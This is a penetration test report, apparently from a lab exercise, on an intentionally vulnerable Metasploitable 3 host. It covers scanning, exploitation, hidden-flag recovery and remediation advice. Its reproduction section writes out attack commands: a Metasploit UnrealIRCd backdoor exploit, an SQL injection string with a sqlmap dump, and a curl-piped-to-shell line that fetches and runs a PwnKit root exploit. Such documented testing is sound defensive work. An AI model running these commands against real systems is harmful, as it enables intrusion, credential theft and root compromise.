# Metasploitable 3 — Penetration Test Report 
*Prepared by:* Mwangi CyberSecurity Company LTD.  
*Date:* September 21, 2025  
*Confidentiality:* This document is confidential and intended for the report owner.

---

## Table of Contents
- [Executive Summary](#executive-summary)
- [Scope](#scope)
- [Methodology](#methodology)
- [Risk Ranking](#risk-ranking)
- [Findings & Evidence](#findings--evidence)
  - [Nmap Findings](#nmap-findings)
  - [Exploit Summary](#exploit-summary)
  - [Flags / Card Faces (Discovery)](#flags--card-faces-discovery)
- [Recommendations](#recommendations)
- [Steps to Reproduce (Commands)](#steps-to-reproduce-commands)
- [Conclusion](#conclusion)
- [Bibliography](#bibliography)

---

## Executive Summary
*Assessment window:* September 20–21, 2025  
This report documents a black-box external penetration test against a single host (Metasploitable 3 — Ubuntu 14.04, IP 10.0.2.15). The exercise simulated an external attacker identifying vulnerable services, exploiting them, and escalating privileges to demonstrate real-world impact.

### Core findings
- Multiple high-severity vulnerabilities allowed initial remote code execution and local privilege escalation (UnrealIRCd backdoor, pkexec PwnKit).
- Application-level issues (SQL injection in payroll app) exposed plaintext credentials.
- Misconfigurations and insecure storage (world-readable files, public docker artifacts) enabled data discovery and exfiltration.
- Overall posture: *Critical* — the host can be fully compromised by an attacker with basic tooling.

---

## Scope
*Target:* 10.0.2.15 (Metasploitable 3 — Ubuntu 14.04)  
*Approach:* Black-box external pentest focused on publicly exposed services.  
*In-scope services:* FTP, HTTP (80/8080), MySQL, IRC, Samba, IPP, etc.  
*Out-of-scope:* Lateral movement to other hosts, DoS, social engineering, anything affecting other tenants.

---

## Methodology
Test methodology combined OWASP STG and PTES phases:

1. *Reconnaissance* — active (nmap) and passive discovery.
2. *Vulnerability analysis* — identify outdated services, weak configs.
3. *Exploitation* — verified with Metasploit, sqlmap, manual techniques.
4. *Post-exploitation* — local enumeration, privilege escalation, data extraction.
5. *Reporting* — actionable remediation guidance and reproduction steps.

*Tools used (representative):*
- nmap, msfconsole (Metasploit), sqlmap, binwalk, exiftool, foremost, pngcheck, pkexec exploit scripts.

---

## Risk Ranking
- *Critical:* Full system compromise, remote code exec, data exfiltration. (e.g., UnrealIRCd backdoor, pkexec)
- *High:* Services with known exploitable CVEs (Apache modules, outdated components).
- *Medium:* Weak credentials, readable sensitive files.
- *Low / Informational:* Hidden data in media files, service banners, DNS info.

Remediation windows suggested in-report: Critical = 24–48 hours; High = 5–8 business days; Medium = 10–15 days; Low = routine.

---

## Findings & Evidence

### Nmap findings
Port/service highlights (from nmap -p- -sV -sC 10.0.2.15):
- 21/tcp — ProFTPD 1.3.5 (FTP) — potential backdoor/exploit.
- 80/tcp — Apache/2.4.7 — web apps (Drupal, phpMyAdmin directories present).
- 445/tcp — Samba 4.3.11 — SMB file sharing.
- 631/tcp — CUPS 1.7 (IPP).
- 3306/tcp — MySQL — database server.
- 6697/tcp — UnrealIRCd — known backdoor versions (remote code execution).
- 8080/tcp — Jetty 8.1.7 — additional web app host.

> Note: Exact versions and vulnerability mappings were cross-checked prior to exploitation.

### Exploit Summary
- *UnrealIRCd backdoor (IRC, port 6697):* Successful remote shell as low-privilege user (boba_fett) via known Metasploit module.
- *SQL Injection (payroll app):* Manual ' OR 1=1# proof-of-concept followed by sqlmap dump; retrieved plaintext user credentials.
- *Privilege Escalation (pkexec / PwnKit):* Local escalation to root using known exploit/tooling.
- *File discovery & exfiltration:* Found flags inside images, audio, docker filesystem, hidden ISO — demonstrated multiple data-exposure vectors.

### Flags / Card Faces (Discovery)
> Long list collapsed for readability. Expand to view notes and commands.

<details>
<summary>Show discovered "card" flags and short notes</summary>

- *3_of_hearts.png* — found in /lost+found/ and verified with md5sum.
- *5_of_hearts.png* — image contained Base64 in metadata; extracted via exiftool and base64 -d.
- *7_of_diamonds.zip* — found in Docker FS; password recovered by decoding a hex/QR artifact → password th1s1s@p@ssw0rd!.
- *8_of_clubs.png* — deep directory under anakin_skywalker user.
- *9_of_diamonds.png* — extracted from mounted ISO inside .secret_files.
- *10_of_clubs.png* — hidden inside 10_of_clubs.wav (zlib extraction).
- *10_of_spades.png* — located in /opt/readme_app/public/images/.
- *ace.png (Ace of Spades/Clubs)* — Base64 data found in chat_client.js and decoded.
- *king_of_spades.png* — recovered by decoding ircd.motd Base64 content and running foremost / pngcheck.

</details>

---

## Recommendations
*Immediate (0–7 days)*
- Patch or remove vulnerable services (UnrealIRCd, pkexec fixes).
- Rotate/replace all exposed credentials; invalidate plaintext credentials discovered in DB.
- Restrict or remove public-facing services not required for production.

*Short-term (7–30 days)*
- Disable unused services (FTP, unused HTTP endpoints).
- Enforce least privilege for services and users.
- Harden configs (disable directory listings, remove default creds).

*Medium-term (30–90 days)*
- Implement network segmentation and container isolation.
- Deploy host-based EDR or monitoring to detect stealthy access (port-knocking, hidden mounts).
- Introduce automated vulnerability scanning & patch management.

*Long-term / Strategic*
- Comprehensive secure development lifecycle (secure coding, input validation).
- Regular pentests and bug bounty programs for continuous assessment.
- Data governance for secure storage, encryption, and retention policies.

---

## Steps to Reproduce (Commands)
> Use these commands in a safe lab environment; *do not* run against production without authorization.

### Enumeration
bash
# Full TCP port scan with service detection and default scripts
nmap -p- -sV -sC 10.0.2.15


### Example Metasploit usage
text
# UnrealIRCd backdoor (example)
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.0.2.15
set RPORT 6697
set LHOST <your-ip>
exploit


### SQL injection (demo)
bash
# Manual test
# Username: ' OR 1=1#
# Automated dump
sqlmap -u "http://10.0.2.15/payroll/index.php?user=1" --dump -T users


### Privilege escalation (example technique)
bash
# Find setuid binaries and attempt PwnKit
find / -perm -u=s -type f 2>/dev/null
# Example PwnKit script (lab only)
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"


### File extraction examples
bash
# Extract Base64 from JS and decode
cat chat_client.js | grep 'IVB0RW0K' | awk -F ' ' '{print $2}' | base64 -d > ace.png

# Extract metadata-based Base64 from image
exiftool 5_of_hearts.png | grep '...' | awk '{print $6}' | base64 -d > five_of_hearts.png

# Extract hidden zlib payload from WAV
binwalk -e 10_of_clubs.wav
dd if=10_of_clubs.wav bs=1 skip=58 of=hidden.zlib
zlib-flate -uncompress < hidden.zlib > 10_of_clubs.png


---

## Conclusion
The Metasploitable 3 host is intentionally vulnerable; the exercise confirmed it can be fully compromised via multiple low- to high-effort vectors. Immediate remediation is required for any similar production systems exhibiting these vulnerabilities.

---

## Bibliography / References
- OWASP Testing Guide (STG)
- PTES (Penetration Testing Execution Standard)
- Metasploit & Rapid7 documentation
- Nmap, SQLMap, Binwalk, ExifTool tooling docs
- Public CVE references for mentioned components (UnrealIRCd, pkexec/PwnKit, ProFTPD)
